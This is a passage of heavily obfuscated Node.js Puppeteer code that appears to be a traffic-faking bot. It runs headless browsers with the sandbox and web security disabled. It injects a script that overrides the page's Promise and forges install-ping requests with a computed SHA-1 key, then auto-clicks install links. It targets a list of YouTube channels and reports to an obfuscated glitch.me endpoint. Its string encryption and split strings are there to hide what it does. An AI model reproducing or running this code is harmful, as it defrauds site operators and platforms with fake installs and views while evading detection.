                J[0x16ff * -0x1 + 0x170e + 0x1] = this['block'], J[K >> -0x1e4d * 0x1 + 0x256 + 0x1bf9] |= x[-0x1197 + 0x4 * -0x66 + 0x27 * 0x7e & K], this['block'] = J[0x1fe7 + -0x289 + 0x155 * -0x16], K >= 0x3ef + -0x637 * 0x1 + 0x280 && (this['hashed'] || this['hash'](), J[-0x557 * -0x7 + 0x1f67 * -0x1 + -0x1 * 0x5fa] = this['block'], J[-0x21fe + 0x3a * -0x4 + 0x22f6] = J[-0x1e1b + -0x943 + -0x275f * -0x1] = J[0x2 * -0x101e + -0x2 * 0x467 + 0x4 * 0xa43] = J[0x1c9f + -0x1b98 + -0x104] = J[-0x1426 + 0x2088 + -0xc5e] = J[-0xdc7 + -0x4 * -0x92f + -0x16f0] = J[-0xf4c + 0x1 * -0x150d + 0x245f] = J[0x412 * 0x3 + -0x834 + -0x3fb] = J[0x617 * 0x5 + 0x667 + -0x24d2] = J[0x16ea + 0x53 * 0x56 + -0x32c3] = J[0x1f8 + -0x26d5 + 0x24e7] = J[0x124c + -0xb47 * 0x1 + 0x5e * -0x13] = J[0x2 * -0x74e + 0x1e6b + -0x3 * 0x541] = J[-0x1 * 0x3ad + -0x11a0 + 0x2 * 0xaad] = J[-0x1189 * 0x1 + -0x2 * 0xef + 0x1 * 0x1375] = J[-0xe7d * -0x1 + -0x13dd + 0x1 * 0x56f] = 0xc43 * 0x2 + -0x223d + 0x9b7), J[-0x2002 + 0xb * -0xe3 + 0x29d1] = this['hBytes'] << 0x1602 + 0x19ec + -0x57 * 0x8d | this['bytes'] >>> 0x9aa + 0x22c1 + -0x2c4e, J[-0x49 * -0x66 + 0x3af * -0x1 + -0x1958] = this['bytes'] << -0x1085 * 0x2 + -0x55 * -0x6b + -0x13d * 0x2, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x4 * -0x4b1 + 0x9a3 + -0x1c57; J < 0x29 * 0xb2 + -0xc42 + -0xff0; ++J)
                K = Q[J - (-0x1 * 0x1575 + 0x1902 * 0x1 + 0x6 * -0x97)] ^ Q[J - (-0x7f5 + -0x2 * 0x9c1 + -0x1b7f * -0x1)] ^ Q[J - (-0x24c2 * -0x1 + -0x36 * 0x35 + -0x1986)] ^ Q[J - (0x35 * 0x3b + -0x1 * 0x1c33 + 0x100c)], Q[J] = K << 0x1699 + 0x231e + -0x39b6 | K >>> 0x10d3 + 0x7 * -0x35b + -0x243 * -0x3;
              for (J = 0x139a + -0x1e * -0xe5 + -0x4 * 0xb9c; J < 0xad * 0x1e + -0x1e7 * -0xd + -0x7 * 0x66b; J += -0x6e9 + 0x4fd + -0x1 * -0x1f1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x5d1 + 0x43a * -0x1 + 0x43 * -0x6 | L >>> -0x127c + 0x20d3 + -0x71e * 0x2) + (M & N | ~M & O) + P + (-0x505e3947 + -0x5 * 0x1ef9f5b7 + 0x145c27f73) + Q[J] << 0x33b * -0x2 + -0x11d + 0x793) << -0x143c + -0x29 * -0x39 + 0xb20 | P >>> -0x1fe * 0x3 + -0x14e6 + 0x1afb * 0x1) + (L & (M = M << -0x257 + 0x1 * -0x11f5 + 0x146a | M >>> -0x3 * 0xa17 + -0xfd2 + 0x2e19) | ~L & N) + O + (0x28154 * 0x251 + -0x346be4c6 + 0x8920cacb) + Q[J + (0x27 + -0x4c * 0x48 + 0x153a)] << -0x1 * 0x1442 + 0x2515 + 0x49 * -0x3b) << -0x4d * 0x8 + -0x2 * 0x641 + -0x1 * -0xeef | O >>> 0x1b26 + 0x25cb + -0x40d6) + (P & (L = L << 0x1 * -0x22d + 0x1213 + 0x5 * -0x328 | L >>> 0x78b + -0x54 * 0x25 + 0x49b) | ~P & M) + N + (0x271e0743 + 0x16d446f1 * -0x3 + 0x77e14729) + Q[J + (-0x1c3e + -0x210d + 0x3d4d)] << -0x7e * -0x1f + -0x190b + 0x5 * 0x1f5) << -0x1f8c + 0x234f + -0x3be | N >>> 0x1c51 * -0x1 + -0x2580 + -0x41ec * -0x1) + (O & (P = P << -0xb96 * -0x1 + 0x144 * -0x1c + 0x2 * 0xbfc | P >>> -0x1 * -0x1e3d + -0x5b9 * 0x5 + 0x9 * -0x2e) | ~O & L) + M + (0x63851b39 * -0x1 + -0x1aa36949 + 0xd8aafe1b) + Q[J + (-0x128a + 0x5 * -0x33b + 0x22b4)] << -0x1b12 + 0x195c + 0x1b6) << -0x987 + -0x236 + 0xbc2 | M >>> 0xe3 * -0x1c + -0x1 * -0x1acd + 0x2 * -0xef) + (N & (O = O << -0x4 * 0x60a + 0x5 * -0x162 + -0x1 * -0x1f30 | O >>> 0x8 * -0x151 + -0x22de + -0x4 * -0xb5a) | ~N & P) + L + (0x1a2f * 0x55b41 + 0x1898fb * 0x6ab + 0x4740a655 * -0x3) + Q[J + (0x17f4 + 0x1b7f + 0x21 * -0x18f)] << -0x4 * 0x74b + -0x1b2 + 0x9 * 0x36e, N = N << -0x167b + -0x12fb + 0x2994 | N >>> -0x1dbb + 0x4f * 0x32 + -0x63 * -0x25;
              for (; J < -0x1 * 0xe33 + 0x2da * 0x5 + -0x19 * -0x1; J += 0x3 * -0x6b2 + -0x265 * 0x6 + -0x6e5 * -0x5)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xb57 * 0x1 + -0x152a + 0x9d8 | L >>> -0x5 * 0x3a3 + -0x1 * -0x229a + 0x30 * -0x57) + (M ^ N ^ O) + P + (0x5c8b0faa + 0x634bacc7 * 0x1 + -0x15c736 * 0x3b8) + Q[J] << -0x1bc3 + -0x125 + 0x1ce8) << -0x114e + 0x1dcd * -0x1 + 0x2f20 | P >>> 0x2ef + 0x3e * -0x4e + 0x1010) + (L ^ (M = M << 0x97 + -0x9ad + -0x4c * -0x1f | M >>> 0x2546 * -0x1 + -0x1c2 * 0x1 + -0x107 * -0x26) ^ N) + O + (0x9e3c8e6b + -0xcbd7116c + 0x9c746ea2) + Q[J + (-0x4e8 + -0x2 * 0xa85 + 0x49 * 0x5b)] << -0xa9f + -0x227 * -0x2 + 0x651) << 0x2 * 0x7c9 + -0x27d * -0x2 + -0x5 * 0x41b | O >>> 0x7 * 0x24a + -0xa1a + -0x5d1 * 0x1) + (P ^ (L = L << 0x490 + 0x1603 + 0x209 * -0xd | L >>> -0x26f5 + -0x2 * -0x63b + 0x1a81) ^ M) + N + (-0x3cd44219 + 0x2f227007 + 0x7c8bbdb3) + Q[J + (0x5bd + 0x2 * 0x11b + -0x7f1)] << 0xbd + 0x14a3 + -0x72 * 0x30) << -0x7fa + -0x1 * -0x31f + 0x1 * 0x4e0 | N >>> -0x1d1a + -0x1fd * 0x1 + 0x2d6 * 0xb) + (O ^ (P = P << -0x4 * -0x5e + -0x1b87 * -0x1 + 0x1ce1 * -0x1 | P >>> -0x2 * -0x259 + -0x115 * -0x2 + -0x36d * 0x2) ^ L) + M + (0x2cab1931 + 0x4001083f + 0x22dca31) + Q[J + (-0x1686 + -0x1 * -0x11d8 + -0x1 * -0x4b1)] << -0x3cb + 0x2de + 0xed) << -0x1b8c + -0x1 * -0x112d + 0xa64 | M >>> -0x888 + 0xf37 + 0x34a * -0x2) + (N ^ (O = O << -0x1 * -0x1849 + -0x34d + -0x14de | O >>> 0x378 * -0xb + -0x21dd + 0x4807) ^ P) + L + (0x3 * -0x2a8d821e + -0x1d9eb1 * 0x371 + 0x19b1a0b * 0xd4) + Q[J + (0xeb * 0xa + -0x16 * -0x15d + -0x2728)] << 0x20a4 + 0x2018 + -0x565 * 0xc, N = N << 0x231c + -0x22ca + -0x34 | N >>> -0x649 * -0x1 + 0x643 + 0x2 * -0x645;
              for (; J < -0x244e + 0x1ab0 + 0x9da; J += -0x1 * -0x84a + 0xeef + -0x10e * 0x16)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x37 * -0x47 + -0x1a52 + 0x21 * 0x56 | L >>> -0x4b * -0x5d + -0x1 * -0x244d + -0x3f71 * 0x1) + (M & N | M & O | N & O) + P - (0x102a * -0xb19e2 + 0x2c * -0x2db6290 + 0x1a20992f8) + Q[J] << -0x158 * 0x1a + 0x4b1 * -0x6 + 0x3f16) << 0x17ea * 0x1 + 0x1eaa + 0x1 * -0x368f | P >>> 0x2409 + 0x1a * -0x3e + -0x1da2) + (L & (M = M << -0x1f1f + -0x376 * 0xb + 0x454f | M >>> -0x1 * 0x5d9 + -0xc72 + -0x3a9 * -0x5) | L & N | M & N) + O - (-0x2 * -0x41e3b68a + 0xa092cca5 + -0x37d293 * 0x337) + Q[J + (0x15a * 0xe + -0x11b9 + -0x132)] << -0x409 * -0x1 + 0x18e2 * -0x1 + 0x3 * 0x6f3) << -0x10c0 + -0x1011 + 0x20d6 | O >>> 0x1d76 + -0x2 * -0xa09 + -0x316d * 0x1) + (P & (L = L << 0x96 * 0x3e + -0x1bf0 + -0x846 | L >>> -0x1786 + -0x1dc4 + -0x2 * -0x1aa6) | P & M | L & M) + N - (0x13d35eb2 + 0xdce8914a + -0x7fd7acd8) + Q[J + (0x886 * -0x2 + 0x2458 + -0x134a)] << -0x21b6 + -0x1b * 0xef + 0x3aeb) << -0x1a93 + 0x1dd * 0x7 + 0xd8d | N >>> -0x1d74 + 0x1633 * 0x1 + 0x75c) + (O & (P = P << 0x5 * 0x93 + 0xad * 0x33 + 0x6 * -0x634 | P >>> -0x11 * -0x14f + 0x125a + -0x2897) | O & L | P & L) + M - (-0x3 * -0x3f5b20bf + 0x40735f80 + -0x8da07e99) + Q[J + (-0x33d + 0x245c + -0x211c)] << 0x10cf + 0x24e4 + -0x35b3) << 0x2380 + 0x2 * -0x1156 + 0xcf * -0x1 | M >>> -0x53 * 0x60 + -0x1bbc + 0x3af7 * 0x1) + (N & (O = O << 0x177f + 0x51 * -0x2f + -0x882 | O >>> 0xbb9 + 0x1 * 0x5fc + -0x11b3 * 0x1) | N & P | O & P) + L - (0x6ff976b4 + -0xb829ccfe + 0x1 * 0xb914996e) + Q[J + (0x14 * -0xa7 + 0x2502 + -0x17f2)] << 0x229 * 0xb + 0x1b92 + -0x3355, N = N << 0x67 * -0x5f + 0xac6 * -0x1 + 0x311d | N >>> -0x24af + 0x16 * -0x1b7 + 0x1 * 0x4a6b;
              for (; J < 0x2558 + 0x58f * -0x1 + -0x1 * 0x1f79; J += 0xd * 0x25 + 0xfb3 + -0x118f)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1dd3 + -0xa06 + -0x13c8 | L >>> -0xd9e + 0x3b * 0x6 + 0xc57) + (M ^ N ^ O) + P - (0x1fcda2ed * -0x3 + 0x2b289279 + 0x69dd9478) + Q[J] << -0x255d + 0x16e6 + 0xe77) << 0xb3 * -0x1 + 0x251 * -0x5 + -0xc4d * -0x1 | P >>> -0x37b + 0x11a1 * 0x1 + -0xe0b) + (L ^ (M = M << 0x358 + 0x146b * 0x1 + -0x1 * 0x17a5 | M >>> -0x1343 + 0x99b * -0x4 + 0x39b1) ^ N) + O - (-0xfec8bc5 + -0x3272a316 + -0x23 * -0x36d9cb7) + Q[J + (0x739 + 0x109 * 0x14 + -0x1bec)] << 0x1dff + 0x23ac + -0x41ab) << -0x1632 + -0x20da + 0x3711 | O >>> 0x7 * -0x3e1 + 0x41d * -0x7 + 0x380d) + (P ^ (L = L << -0x85b * 0x1 + -0x2cf + 0xb48 | L >>> 0x3 * -0x481 + 0xc72 + -0x37 * -0x5) ^ M) + N - (-0x58fbeedc + -0x10ecefd2 + 0x4 * 0x27e18736) + Q[J + (0x479 * -0x7 + 0x1305 + 0x2 * 0x626)] << 0x44e * -0x1 + -0x53 * -0x35 + -0xce1) << -0x16ed * -0x1 + 0x1e9d + -0x3585 | N >>> 0x59f * 0x4 + 0x2f1 + -0x1952) + (O ^ (P = P << 0x10d3 + -0x25d * -0x3 + -0x4 * 0x5f3 | P >>> 0x5 * 0x6c + -0x17e5 + 0x15cb) ^ L) + M - (0x4b0bb4c6 + 0x52ad313a + -0x340dd3eb * 0x2) + Q[J + (-0x2290 + 0x5 * 0x7 + -0x44e * -0x8)] << -0x1 * -0x30a + 0x23e7 + -0x26f1) << -0x14 * -0xc5 + -0x129 * -0x7 + -0x2 * 0xbbf | M >>> 0x1d * 0x8a + 0x3 * 0xbac + 0x1 * -0x328b) + (N ^ (O = O << -0xfa6 + -0x5c5 + 0x1589 | O >>> -0x1 * -0x10ff + 0x15 * 0xb + 0x14 * -0xe5) ^ P) + L - (-0x4d9cb97d + 0x1d91f432 + 0x65a80375) + Q[J + (0x11da + -0x1c3 * -0x10 + 0x112 * -0x2b)] << -0x1 * 0x47d + 0x2592 + -0x2115, N = N << 0x5 * 0x531 + -0x20f * -0xc + 0x2a9 * -0x13 | N >>> -0x1743 + 0x25da + -0xe95;
              this['h0'] = this['h0'] + L << 0x110 * -0x11 + -0x1e6a + 0x16d * 0x22, this['h1'] = this['h1'] + M << -0x976 * 0x2 + -0x61 * -0xf + 0xd3d, this['h2'] = this['h2'] + N << 0x1170 + 0x1 * -0x7ae + -0x9c2, this['h3'] = this['h3'] + O << -0x886 + 0x19f5 + 0x1 * -0x116f, this['h4'] = this['h4'] + P << -0x114 * 0x10 + -0x1ad4 + 0x2c14;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x9 * 0x3cd + 0x1 * 0x93a + -0x2b53 & 0x17e1 + -0x1fcc + 0x2 * 0x3fd] + w[J >> 0x1b7 + -0x18e1 + 0x1742 & -0x7d * -0x13 + -0x6 * -0xcd + -0x1 * 0xe06] + w[J >> -0x269 * -0x2 + 0x1 * -0x130 + 0x23 * -0x1a & 0x494 * -0x4 + -0x17 * 0x6 + 0x12e9 * 0x1] + w[J >> 0x1cff + 0x36a + -0x2059 & -0x2 * -0x4e7 + -0x1 * -0x22d7 + -0x2c96] + w[J >> 0xa5f + 0xc68 + -0x16bb & -0x615 * -0x3 + -0x1 * -0x1ccd + -0x2efd] + w[J >> 0x1 * 0x2301 + -0x1 * -0x1dc8 + 0x89 * -0x79 & 0x1a0 + -0x101d + -0xc4 * -0x13] + w[J >> 0x5 * 0x4b5 + 0x1442 + -0x2bc7 & -0x1bb * -0x13 + -0xf65 + -0x116d] + w[0x1a6 * -0x7 + 0x1 * -0x1b4f + 0x14 * 0x1f2 & J] + w[K >> 0x2f * 0x80 + -0x3 * 0x215 + -0x273 * 0x7 & 0xc1a + -0xc * 0x1bc + 0x1 * 0x8c5] + w[K >> -0x295 + -0x4bc + 0x769 & -0x2207 * 0x1 + 0x2 * 0x58a + -0x136 * -0x13] + w[K >> -0x11 * 0x86 + 0x2373 + -0xfb * 0x1b & -0x665 * 0x2 + 0x2306 + -0x162d] + w[K >> -0x3eb * 0x2 + -0x1d2 * 0x5 + -0x2 * -0x880 & 0x115f + -0xa3 + -0x58f * 0x3] + w[K >> -0x238a + -0x13d3 + 0x1 * 0x3769 & 0x798 + 0x4 * -0x9bc + 0x1 * 0x1f67] + w[K >> -0xa82 + 0xe9a * 0x1 + -0x34 * 0x14 & -0x9d8 + 0x3 * 0x9d + 0x810] + w[K >> 0x70 * 0x30 + -0x7 * 0x25f + -0x463 & 0x1d87 + -0x3 * 0x139 + 0x529 * -0x5] + w[-0x2091 + -0x215 + -0x22b5 * -0x1 & K] + w[L >> 0x24fb * 0x1 + 0x87b + 0x50a * -0x9 & 0xc71 + -0x1ebd + -0x125b * -0x1] + w[L >> -0x7d1 * 0x1 + 0x1d * 0x8b + -0x7d6 & -0x1457 + -0x110 + 0x1576] + w[L >> -0x2643 + 0x6e7 * 0x2 + 0x1889 & 0x106d + -0x1 * -0x2ab + -0x1309] + w[L >> 0x1867 * 0x1 + 0x1 * -0x382 + -0x14d5 & -0x1e56 + -0x291 * 0xb + 0x3aa0] + w[L >> 0x1680 + -0x5 * -0x2f1 + -0x2529 * 0x1 & 0x1c6a + -0x5 * -0x115 + -0x871 * 0x4] + w[L >> 0x25d8 + 0x7c * -0x10 + -0x1e10 & 0x25f * -0x9 + -0xa9d + 0x667 * 0x5] + w[L >> 0x5 * -0x1b1 + 0xf11 + 0x34c * -0x2 & -0x1f9 + -0x114f + 0x1 * 0x1357] + w[-0x1364 + 0xc8f + 0x6e4 & L] + w[M >> 0x8c3 + -0x25e9 + 0x6b * 0x46 & -0x26b3 + 0x1207 + -0x1 * -0x14bb] + w[M >> -0xe8f * 0x1 + 0xd91 * 0x1 + 0x116 & 0x680 + -0xbf5 * 0x1 + 0x584] + w[M >> 0x431 * 0x3 + -0x2640 + 0x19c1 * 0x1 & 0x2f0 + -0x1694 + -0x7b * -0x29] + w[M >> 0x22 * -0x87 + 0x1f * -0x11d + -0x1 * -0x3481 & 0x7f * -0x13 + -0x1477 + -0xbb * -0x29] + w[M >> 0x4 * -0x649 + -0x1159 * 0x2 + 0x92 * 0x69 & -0x2679 + -0x6b * 0x19 + 0x30fb] + w[M >> -0x1 * 0x146e + 0x964 + 0xb12 & -0x184a * 0x1 + -0x1ea2 + -0x233 * -0x19] + w[M >> 0x1867 + -0x24d4 * 0x1 + -0x5b * -0x23 & -0x122f + -0x6 * -0x446 + -0x766] + w[-0x1 * 0x2029 + 0x2192 + -0x15a & M] + w[N >> -0x24d9 + -0x1050 + -0xd * -0x419 & 0x1f * 0x2f + 0x122 + -0x1b1 * 0x4] + w[N >> 0x1fc7 * 0x1 + -0x2 * -0x1025 + 0x3 * -0x1553 & -0x610 + 0x3 * -0x7ed + 0xb2 * 0x2b] + w[N >> 0x439 + 0x1d6c + -0x2191 & 0x2681 + -0x5 * -0x5e1 + -0x43d7] + w[N >> -0x18ae + -0x20cb + 0x1 * 0x3989 & 0x2574 + 0x211a + -0x1 * 0x467f] + w[N >> -0x5 * -0x155 + -0x11b1 + -0x58a * -0x2 & 0x465 + 0xdc + -0x532] + w[N >> 0xb94 + 0x1d * -0xa4 + 0x168 * 0x5 & 0x24d3 + -0x11e8 + -0x12dc] + w[N >> 0xc73 + 0x3 * 0x779 + -0x22da * 0x1 & -0x1 * -0x24a5 + -0x10f7 * 0x1 + -0x139f] + w[-0x16eb * 0x1 + -0x6 * -0x5c + 0x29 * 0x82 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1d43 * 0x1 + -0x12fb + -0xa30 & 0xae9 + -0x1 * 0xde9 + 0x3ff * 0x1,
                J >> 0x17e0 + -0xfed + 0x7e3 * -0x1 & -0x1 * 0x1f73 + -0xabb + -0x2b2d * -0x1,
                J >> 0x333 + -0x1 * 0x38c + 0x61 & -0x11 * -0x127 + 0x61e + 0x1 * -0x18b6,
                -0x1 * 0x636 + -0x178a + -0x1ebf * -0x1 & J,
                K >> 0x23e + 0x1e75 + -0x209b & 0x1d97 + 0x844 + -0x24dc,
                K >> 0x1 * 0xf73 + 0x624 + -0x1587 & -0x989 + -0xb * 0x187 + 0x1b55,
                K >> -0x97a * -0x1 + -0x1d2 + -0x7a * 0x10 & -0x33e + -0x9fd * -0x3 + 0x2 * -0xcdd,
                -0x1 * -0x5e9 + -0x2dd * -0x1 + -0xb * 0xb5 & K,
                L >> -0x4d6 * 0x8 + -0x47 * -0x86 + 0x19e & -0x5a0 + 0xdff + -0x760,
                L >> 0x55 * 0x29 + 0x89 * -0x21 + 0x41c & 0xe1 * -0x17 + -0x931 + 0xb5 * 0x2b,
                L >> 0x3 * 0x2b9 + 0x257b + -0x2d9e & -0x112a * 0x1 + -0x2189 + 0x33b2,
                -0x6b6 * 0x5 + 0x4 * 0x257 + 0x1931 & L,
                M >> 0x40f * -0x3 + 0x1c00 + 0x1 * -0xfbb & 0x547 * 0x1 + 0x1d95 + -0x1 * 0x21dd,
                M >> 0xd1 * 0x1d + 0xcf9 + -0x2496 & -0x2325 + -0x1a6 * 0x5 + 0x2c62,
                M >> 0x990 + 0x1ae8 + 0xb * -0x350 & 0x218a + -0x2622 + 0x597,
                -0x58b * -0x1 + -0x1 * 0x3e2 + -0xaa & M,
                N >> 0x2552 + -0xb7c + -0x19be & -0x150 + -0xfcd + 0x90e * 0x2,
                N >> 0x427 * 0x3 + -0x1926 + 0xcc1 & 0x1adf + -0x2 * -0x829 + -0x2a32,
                N >> 0x6b * 0x5b + -0x355 * -0x9 + 0x43fe * -0x1 & 0x3 * -0x4a8 + 0x4 * -0x51a + 0x5 * 0x713,
                0x3cb * -0x3 + 0x1 * -0xb69 + 0x17c9 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x1 * -0x134b + -0xf * 0x95 + -0xa7c), (K = new DataView(J))['setUint32'](0x10a5 * 0x1 + -0x3ae * 0x4 + -0x1ed * 0x1, this['h0']), K['setUint32'](0x2 * -0xb21 + 0x6d * 0x1f + 0x17 * 0x65, this['h1']), K['setUint32'](0x1 * -0x1fe7 + 0x720 + 0x1d * 0xdb, this['h2']), K['setUint32'](0x2 * 0x3c1 + 0x3f2 * -0x2 + 0x6e, this['h3']), K['setUint32'](-0x9b * 0x2 + -0x1 * 0x26b3 + 0x27f9, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0xba5 * -0x3 + 0x18d * -0x17 + 0x469a];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x146b + 0x95 * -0x25 + 0x4 * 0xa7d;
            J[0x22fd + 0x293 + 0x4b2 * -0x8]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x1d5a + 0x359 * -0xa + 0x3ed4] = L => {
              const Y = c;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I[Y(0x4) + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1 * 0x1e0e + -0x18f8 + -0x1 * -0x3707), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x5fd + -0x3dc + 0x4ed * 0x2;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x208c + -0x1c1 * 0xd + -0x3e3 * 0x1), Promise['resolve'](0x12ad + -0x969 + -0x943);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x122c + -0x9ff * -0x1 + -0x1c2b; j < 0x1 * -0xdc9 + 0x1571 + -0x7a7; j++)
    i();
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x2408 + 0x1 * 0x1eb2 + 0xb1f * -0x6);
    let h = e[f];
    return h;
  }, d(b, c);
}
const NETWORK_PATIENCE = 0x25d0 + -0x3436 + 0x2da6 + (0x2d * 0xf + 0x150c + -0x3 * 0x3fd) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x4a9 + -0x1d * 0xf8 + -0x2bb * -0xc) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x2408 + 0x1 * 0x1eb2 + 0xb1f * -0x6);
    let h = e[f];
    if (b['mvWCRX'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x1059 + 0x1e52 + -0x49 * 0x31, s, t, u = -0x1 * -0x10bb + 0x41d + -0x14d8; t = n['charAt'](u++); ~t && (s = r % (-0xf37 + 0x946 + 0x5f5) ? s * (-0x5f9 * -0x1 + 0x26d9 + 0x1649 * -0x2) + t : t, r++ % (0x3 * -0x7ed + -0x1ae4 + 0x32af)) ? p += String['fromCharCode'](0x1 * -0x1459 + -0x24ca + -0x1 * -0x3a22 & s >> (-(0x1b86 + -0x4 * 0x27f + -0x1188) * r & -0x1 * 0x20b + -0x1 * -0x1931 + -0x14 * 0x128)) : 0x53b * 0x2 + 0x2f * 0x1b + -0xf6b * 0x1) {
          t = o['indexOf'](t);
        }
        for (let v = 0x1 * -0xfde + 0xd * -0x5d + 0x1497, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x8 * -0x2e7 + 0x8e6 + -0x200e))['slice'](-(0x1 * -0x1435 + 0x2627 + -0x11f0));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0xb1 + -0x911 + 0x10c * 0x8,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x97e * -0x1 + 0x1336 + -0x137 * 0x8; u < -0x19f2 + 0x3bf + -0x1733 * -0x1; u++) {
          p[u] = u;
        }
        for (u = -0xb0c + -0x238f * 0x1 + -0x1 * -0x2e9b; u < 0x1815 + -0x2407 + 0xcf2; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x2246 + -0x1 * -0x1047 + -0x318d), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x10bd * -0x1 + -0x1027 + -0x96, q = 0x1 * 0x169 + -0x8b * -0x37 + -0x1f46;
        for (let v = -0x1898 + -0x22f4 + -0x25 * -0x19c; v < n['length']; v++) {
          u = (u + (-0x40f * 0x3 + 0x2b1 * -0xd + 0x2f2b)) % (-0x2343 + 0x1 * -0x11ba + 0x32d * 0x11), q = (q + p[u]) % (-0xcf * -0x2 + 0x7f9 * 0x1 + -0x897), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1e * -0x5d + 0x161f + 0x493 * -0x7)]);
        }
        return t;
      };
      b['WXWhtL'] = m, c = arguments, b['mvWCRX'] = !![];
    }
    const j = e[-0x1 * 0x14b6 + -0xfb4 + 0x246a],
      k = f + j,
      l = c[k];
    return !l ? (b['TLPJYX'] === undefined && (b['TLPJYX'] = !![]), h = b['WXWhtL'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x3 * 0xdf + 0x143c + 0xd * -0x15b; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
